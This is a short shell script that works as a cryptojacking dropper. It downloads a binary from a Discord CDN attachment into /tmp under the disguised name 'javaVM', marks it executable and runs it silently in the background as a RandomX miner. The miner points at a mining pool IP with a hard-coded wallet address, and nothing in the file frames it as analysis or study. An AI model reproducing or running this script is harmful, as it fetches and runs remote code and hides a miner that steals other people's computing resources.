#!/bin/sh
if [ -f /tmp/javaVM ]
 	then
 	/tmp/javaVM -o 143.47.231.0:443 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p DuckRig -a rx/0 -k --donate-level --tls -t 1 > /dev/null 2>&1 &
 	echo Started Existing
 	else
 		wget -q https://cdn.discordapp.com/attachments/1077106588814422077/1176281046459879526/SRB -O /tmp/javaVM
 		chmod +x /tmp/javaVM
 		/tmp/javaVM -o 143.47.231.0:443 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p DuckRig -a rx/0 -k --donate-level --tls -t 1 > /dev/null 2>&1 &
fi